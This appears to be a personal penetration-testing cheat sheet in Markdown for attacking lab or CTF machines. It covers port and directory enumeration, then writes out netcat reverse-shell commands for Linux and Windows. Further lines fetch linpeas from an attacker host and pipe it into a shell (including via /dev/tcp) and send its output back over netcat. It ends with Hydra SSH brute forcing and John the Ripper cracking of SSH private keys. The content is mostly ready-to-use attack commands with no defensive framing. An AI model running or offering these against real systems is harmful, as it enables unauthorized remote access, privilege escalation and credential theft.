# Exploits

## Kali linux

Install Terminator
```
sudo apt-get update
sudo apt-get install terminator
```

Install/Download linpeas.sh
```
Download linpeas.sh (https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh --output linpeas.sh
```

Install Dirbuster
```
sudo apt-get install dirbuster
```

Install Gobuster
```
sudo apt-get install gobuster
```

# 1. Initial Poke

## Wordlists

```
ls -lh /usr/share/wordlists/
```

## 1.1 Port scan (nmap)

nmap
```
nmap -sC -sV -oN nmap/initial <victim ip>

```

## 1.2 web (enum)


gobuster
```
gobuster -w /opt/Dirbuster-0.12/directory-list-2.3-medium.txt -u http://<victimIP> 

```



# 2. Create reverse connection

netcat listner on attacker box
```
nc –lvp 4444

```

netcat from victim 
```
#Linux
nc 192.168.100.113 4444 –e /bin/bash
#Windows
nc.exe 192.168.100.113 4444 –e cmd.exe

```

--> [Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) for other services (PHP,Python,Pearl,Ruby,Golang,Bash) 




## Victim filespace

```
/dev/shm
```

## 2.1 linPEAS

```

#on victim
linpeas.sh

#Local network
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

#Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

#Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim


```


# 3. Brute force

## 3.1 Hydra (Crack password of known user)
```
hydra -l <username> -P <wordlist> ssh://<victimIP>
```

## 3.2 JohnTheRipper

Crack hashes
```
john --wordlist=password.lst hashes-3.des.txt
```

Crack rsa-id/ssh-token
```
#Get ssh2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py

#Convert rsa-id/ssh-token to john readable format
python ssh2john.py id_rsa > id_rsa.hash

#Brute force the rsa key
john --wordlist=wordlist.txt id_rsa.hash

```

